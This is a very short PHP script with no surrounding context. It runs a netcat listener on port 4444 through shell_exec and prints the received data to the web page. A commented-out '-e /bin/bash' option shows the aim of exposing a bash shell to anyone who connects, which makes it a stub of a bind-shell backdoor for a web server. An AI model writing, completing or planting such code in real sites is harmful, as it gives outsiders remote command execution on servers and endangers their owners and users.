<?php
$output = shell_exec('nc -l 4444');
//-e /bin/bash
echo "<pre>$output</pre>";
?>